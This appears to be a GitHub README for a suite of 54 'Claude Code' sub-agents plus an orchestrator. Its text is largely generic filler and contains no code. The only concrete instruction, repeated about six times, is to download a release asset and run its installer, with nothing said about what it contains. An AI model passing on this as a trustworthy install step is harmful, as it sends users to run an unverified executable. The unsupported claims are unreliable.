# Claude Code Unified Agents 🤖

Stay up to date with the latest release assets: https://github.com/muhammad-bu/claude-code-unified-agents/releases

[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github)](https://github.com/muhammad-bu/claude-code-unified-agents/releases)

![Robot Logo](https://img.icons8.com/ios-filled/100/000000/robot.png)

Claude Code Unified Agents is a curated collection of Claude Code sub-agents designed to work together in smart, scalable workflows. This repository brings together 54 production-ready agents across development, infrastructure, quality, AI/ML, business, creative, meta-management, and specialized domains. Each agent is built from robust, tested patterns and includes a large set of production-ready code examples to help you ship reliable software faster.

Overview
- A unified suite of 54 agents that cover a wide range of domains
- Master orchestrator to coordinate multi-agent workflows
- Clear category organization for easy discovery and reuse
- Deep specialization: every agent ships with 1000+ lines of production-grade code samples
- Flexible tool access with per-agent permissions
- Industry best practices embedded across all agents
- Meta-management capabilities for context handling, workflow optimization, and automation

Why this project exists
- Teams often stitch together several open-source agents to solve complex problems. This project provides a cohesive, battle-tested starting point.
- The agents are designed to be complementary. The master orchestrator coordinates tasks across agents, sharing context and ensuring consistent outputs.
- The catalog spans technical work, business processes, creative tasks, and organizational automation, making it easier to scale both technical and non-technical workflows.

Key Features
- 54 Production-Ready Agents
  - Each agent ships with practical code, ready to adapt to real projects.
  - Agents are grouped by domain to speed up discovery and adoption.
- Smart Orchestration
  - A central orchestrator delegates work, tracks progress, and reconciles results.
  - Context propagation and lifecycle management reduce duplication and drift.
- Flexible Tool Access
  - Tool permissions are configurable per agent.
  - Security and compliance controls are built in by default.
- Best Practices
  - Agents follow established design patterns, testing strategies, and code quality standards.
  - Documentation and examples are included to accelerate onboarding.
- Meta-Management
  - Advanced agents help with context binding, workflow optimization, and automation.

Images and visuals
- A hero robot icon to reflect the automation theme
- Simple diagrams illustrating multi-agent workflows
- Badges showing release status and compatibility

Agent Categories
The agents are organized into practical domains. Each category below lists the agents and a concise description of their role.

### 🔧 Development (14 agents)
- DevCompilerAgent — Compiles, bundles, and validates builds; detects regressions early.
- CodeReviewerAgent — Analyzes code for style, readability, error-prone patterns, and maintainability.
- UnitTestGeneratorAgent — Creates unit tests from code and specifications; suggests test suites.
- APIStubGeneratorAgent — Produces mock and stub implementations for API surfaces.
- DocsSyncAgent — Keeps docs aligned with code changes and API specs.
- LintAdvisorAgent — Recommends lint rules and fixes; helps enforce coding standards.
- DependencyGuardAgent — Monitors dependencies, reports drift, and suggests upgrades.
- RefactorPlannerAgent — Proposes safe refactors with impact previews and rollbacks.
- PerformanceProfilerAgent — Measures CPU/memory usage and identifies bottlenecks.
- SecurityAuditAgent — Scans code for vulnerabilities, smells, and security best practices.
- CIConfigurationAgent — Generates and tunes continuous integration pipelines.
- LocalDebugAgent — Creates interactive debug sessions with live data in a safe sandbox.
- IDEAutomationAgent — Automates repetitive IDE tasks, templates, and snippets.
- TestDataFabricatorAgent — Produces realistic, synthetic test data for scenarios.

### 🏗️ Infrastructure (12 agents)
- CloudOpsAgent — Manages cloud resources, cost awareness, and optimization hints.
- InfraAsCodeAgent — Translates infrastructure needs into reproducible IaC templates.
- InfraCostOptimizerAgent — Analyzes spend, suggests optimizations, and flags waste.
- MonitoringAgent — Sets up and tunes monitoring for systems and services.
- AlertingAgent — Configures alerts, on-call routing, and escalation policies.
- IncidentResponseAgent — Guides incident handling with playbooks and runbooks.
- SecretsManagerAgent — Manages credentials securely and rotates secrets.
- NetworkPolicyAgent — Audits and enforces network segmentation and access controls.
- SREHealthCheckerAgent — Performs health checks, SLIs, and SLO verifications.
- BackupRestoreAgent — Plans and executes backup strategies and restoration tests.
- DeploymentOrchestratorAgent — Coordinates canary and blue-green deployments.
- K8sOperatorAgent — Manages Kubernetes resources and operator patterns.

### 🧩 Quality (6 agents)
- TestCoverageAgent — Assesses test coverage and suggests gaps to fill.
- SeleniumAutomatorAgent — Automates UI tests and end-to-end flows in browsers.
- QAAutomationAgent — Builds QA pipelines and repeatable test suites.
- FuzzingAgent — Exercises inputs to reveal edge cases and robustness issues.
- AccessibilityTesterAgent — Checks accessibility compliance and improvements.
- LocalizationQAAgent — Verifies localization and internationalization quality.

### 🤖 AI/ML (7 agents)
- ModelEvalAgent — Evaluates model performance with meaningful metrics and dashboards.
- DataPrepAgent — Cleans, validates, and transforms data for ML pipelines.
- ExperimentRunnerAgent — Manages experiments, tracks results, and documents findings.
- FeatureStoreAgent — Manages feature definitions and data lineage.
- HyperparameterTunerAgent — Scans hyperparameters to find better configurations.
- ModelExplainabilityAgent — Produces explanations and interpretability reports.
- BiasDetectionAgent — Detects bias in data and model outputs, flags concerns.

### 💼 Business (5 agents)
- ComplianceAgent — Tracks policy requirements and regulatory changes.
- FinanceInsightAgent — Analyzes financial data and highlights opportunities.
- RiskAssessmentAgent — Assesses operational and strategic risk factors.
- CustomerJourneyAgent — Maps customer journeys and identifies optimization points.
- SalesForecastAgent — Generates forecasts with scenario planning.

### 🎨 Creative (4 agents)
- ContentGenAgent — Generates marketing copy and content ideas.
- ImagePromptAgent — Creates image prompts aligned with brand and campaign goals.
- VideoStoryboardAgent — Plans video narratives and shot sequences.
- BrandVoiceAgent — Maintains consistent brand voice across channels.

### 🧭 Meta-management (4 agents)
- ContextBinderAgent — Keeps context consistent across agents and tasks.
- WorkflowOptimizerAgent — Analyzes workflows and suggests optimizations.
- MasterOrchestratorAgent — The central coordinator that orchestrates cross-agent collaboration.
- MemoryManagerAgent — Handles long-term context storage and retrieval.

### 🗺️ Specialized domains (2 agents)
- LegalResearchAgent — Gathers and analyzes legal precedents and regulatory texts.
- EducationTutoringAgent — Delivers structured tutoring sessions and learning paths.

How the system fits together
- Core orchestration: The MasterOrchestratorAgent coordinates tasks, schedules work, and consolidates results from all participating agents.
- Context sharing: Agents share a structured context, enabling informed decisions and smoother handoffs.
- Tool access: Each agent receives a tailored set of tools. Access is controlled to minimize risk and ensure compliance.
- Observability: Every action is logged, traceable, and testable. You can audit decisions and outcomes.

Getting Started
- Important note about releases: For installation, download the latest release asset from the Releases page and run the included installer. The asset is designed to set up dependencies, the runtime, and the orchestrator in one step. The Releases page is accessible here: https://github.com/muhammad-bu/claude-code-unified-agents/releases
- Step-by-step quick start
  1) Visit the Releases page to download the latest asset. The asset is a self-contained package that includes the runtime, dependencies, and the orchestrator. After downloading, extract the archive to a working directory.
  2) Run the installer script appropriate for your platform. On Linux/macOS, you typically run a shell script; on Windows, you may run an executable. The installer configures the environment and prepares the 54 agents for use.
  3) Start the master orchestrator. The command line interface accepts commands to initialize contexts, kick off multi-agent workflows, and monitor progress.
  4) Connect the client or CLI to the orchestrator. You can issue high-level workflows or drill into individual agents as needed.
  5) Explore the agent catalog. Each agent is documented with its responsibilities and example usage.
- If you only need to browse first, you can visit the Releases page to see what assets are available and what platforms are supported. The Releases page is the central place to discover build artifacts and download options.
- To confirm you’re using the correct version, check the version badge in the release notes. The release notes include compatibility information, known issues, and upgrade steps.

Platform and environment notes
- Linux: The Linux asset is built for modern distributions and uses standard system libraries. It aims to work on mainstream distros without heavy customization.
- macOS: The macOS asset targets recent macOS versions with the default system toolchain. It aims to minimize conflicts with common developer environments.
- Windows: The Windows asset provides a straightforward installer with a lightweight runtime. It’s designed for developers and teams that rely on Windows tooling.
- Docker: A Docker image is available for teams who prefer containerized deployment. The image bundles the orchestrator, agents, and dependencies in a portable unit.
- Direct integration: The assets include sample configuration files that demonstrate how to plug the agents into existing CI/CD pipelines or internal automation stacks.

Configuration and customization
- Configuration model: Each agent has a set of knobs to control behavior, permission levels, and integration points. Configuration is stored in YAML files by default, with optional environment-variable overrides.
- Tool access: Tools required by agents (APIs, databases, and services) are declared per agent. You can enable or disable access depending on security requirements or deployment context.
- Context management: Context is a central concept. The MasterOrchestratorAgent propagates context between stages, so downstream agents receive the right information to do their work.
- Secrets and credentials: Secrets are managed through a dedicated SecretsManagerAgent or external secret stores. Access to credentials is restricted and audited.

Usage patterns and workflows
- Multi-agent workflows: A typical workflow starts with a planning phase, followed by execution by specialized agents, and ends with validation and reporting. The orchestrator coordinates the sequence, retries on transient failures, and collects evidence for audits.
- Dev workflow example: A developer request triggers the DevCompilerAgent, which triggers UnitTestGeneratorAgent and LintAdvisorAgent in parallel. The CIConfigurationAgent then updates pipelines based on the results.
- Data-heavy workflow example: DataPrepAgent cleans inputs, FeatureStoreAgent organizes features, ModelEvalAgent runs assessments, and ModelExplainabilityAgent generates interpretability reports for stakeholders.
- Compliance-driven workflow example: ComplianceAgent tracks policy constraints, SecurityAuditAgent scans code, and SecretsManagerAgent ensures secrets remain protected during the whole cycle.

Best practices and patterns
- Clear contracts: Each agent has a defined input/output contract. Use these contracts to compose workflows reliably.
- Idempotence: Agent actions are designed to be idempotent when possible, reducing risk in retries.
- Observability: Logs and metrics are exposed for every agent. Use them to understand system behavior and diagnose issues.
- Testing: Each agent ships with example test cases and documentation to validate behavior in isolation and within workflows.
- Security posture: Permissions and secrets follow the principle of least privilege. Audit trails are in place.

Architecture and design notes
- Modular design: Agents are decoupled with lightweight adapters. You can swap implementations without breaking the orchestration rules.
- Extensibility: New agents can be added by following the existing contract. The orchestrator can accommodate new domains without core changes.
- State management: Context and state flow through the system, enabling continuity across steps and even across re-runs.

Testing and quality guarantees
- End-to-end tests: The repository includes sample workflows to validate the orchestration and inter-agent communication.
- Unit tests: Each agent ships with unit tests that exercise core logic and edge cases.
- Performance tests: Researchers and engineers can run performance tests to identify bottlenecks and validate improvements.

Security and governance
- Access control: Per-agent permissions ensure only the required tools are accessible.
- Data handling: Sensitive data is handled with care. Data masking and audit logging are standard practices.
- Compliance: The architecture supports regulatory requirements by design, including audit trails and versioned workflows.

Roadmap and future work
- More agents across domains: The catalog can expand to cover additional specialized areas as needs evolve.
- Better visualization: A dashboard will help monitor flows, agent health, and workflow progress.
- AI safety improvements: Enhanced guardrails and explainability features to support responsible AI usage.

Changelog and releases
- Each release includes a summary of changes, bug fixes, and new agents. Release notes help you assess compatibility and upgrade steps.
- The latest release assets are available on the Releases page. For quick access, revisit: https://github.com/muhammad-bu/claude-code-unified-agents/releases

Releases and artifacts
- For downloads, check the Releases page mentioned above. The assets are organized by platform and include installers and runtime packages. The link is provided again here for convenience: https://github.com/muhammad-bu/claude-code-unified-agents/releases
- After downloading the appropriate asset, follow the included instructions to extract, install, and configure the system. The asset contains sample configuration files and starter workflows to help you begin quickly.

Configuring for your environment
- Environment variables: You can tailor the behavior with environment variables as needed. Examples cover logging level, concurrency, and feature toggles.
- YAML configuration: Start from the provided sample configs and adjust per your environment. The YAMLs describe agent-specific options, available tools, and permission boundaries.
- Secrets management: Integrate your existing secrets store to avoid embedding credentials in configuration files.

Examples and recipes
- End-to-end product workflow: Show how a product team can plan, build, test, deploy, and monitor a feature using multiple agents in a single run.
- Data science pipeline: Demonstrate data preparation, feature engineering, model evaluation, and explainability reporting in a cohesive sequence.
- Compliance-first workflow: A path that emphasizes policy checks, security reviews, and traceability for audits.

Contribution and governance
- Code style: The project follows a clear, consistent style to make collaboration easier.
- Contributions: If you want to contribute new agents, follow the contribution guide to open a pull request with tests and documentation.
- Community guidelines: Be respectful, be precise, and keep issues and discussions constructive.

Documentation and help
- Each agent documentation includes purpose, inputs, outputs, example usage, and potential pitfalls.
- The orchestrator documentation explains how to structure workflows, handle errors, and extend the orchestration capabilities.
- Troubleshooting guides cover common issues, with steps to diagnose problems and restore healthy states.

License
- The project uses a permissive license to encourage adoption and adaptation. Review the LICENSE file in the repository for full terms.

FAQ
- How many agents are available? There are 54 production-ready agents spanning eight domains.
- How do I start? Download the latest release asset from the Releases page and run the installer. The orchestrator will guide you through initial setup and first workflows.
- Can I add my own agents? Yes. The architecture is designed to accept new agents with minimal changes to the orchestrator.

Advanced topics
- Optional Docker deployment: Run a containerized environment for reproducible results and simplified deployment.
- High-availability setups: Strategies for multiple orchestrators with shared state and fault tolerance.
- Observability stack: How to integrate with your existing monitoring and incident response tooling.

Security considerations
- Always review the tools accessed by each agent. Limit tool privileges to only what is necessary for the task.
- Use secure secret management practices and rotate credentials regularly.
- Enable audit logging for critical workflows and changes to configurations.

Developer notes
- The agents and orchestrator follow a shared contract to ensure smooth interoperability.
- Adding a new agent involves implementing the standard interfaces and providing sample usage.
- Tests cover typical success paths as well as common failure modes to ensure resilience.

User guide highlights
- Quick-start commands for common scenarios
- How to trigger complex multi-agent workflows
- How to inspect progress, logs, and results

Illustrative workflow diagrams
- Diagrams show how the master orchestrator coordinates across domains, with context propagation and result consolidation.
- Visual cues describe how data moves between agents and how decisions are made.

Orbiting concepts
- Context: The medium through which agents share information and decisions.
- Orchestrator: The head of the system, coordinating tasks, retries, and results.
- Agents: Specialized workers that execute tasks, guided by contracts and permissions.
- Tools: Interfaces or services that agents can call to perform work.
- Secrets: Secure payloads used by agents to access external services and data stores.

Architectural decisions
- Modularity: Agents are independent pieces that can be replaced or extended without reworking the entire system.
- Stability: Carefully chosen default settings keep workflows predictable while leaving room for optimization.
- Observability: Every action is traceable; logs, metrics, and traces are available for debugging and auditing.

Appendix: Quick references
- Release page: https://github.com/muhammad-bu/claude-code-unified-agents/releases
- Orchestrator guide: Detailed instructions on configuring, starting, and using the MasterOrchestratorAgent
- Agent catalog: A complete list of agents and their responsibilities

Final notes
- This repository aims to deliver a coherent, scalable set of tools for modern software development, operations, and data science workflows.
- The combination of a master orchestrator and a large catalog of specialized agents helps teams move faster while maintaining quality and governance.

End of document

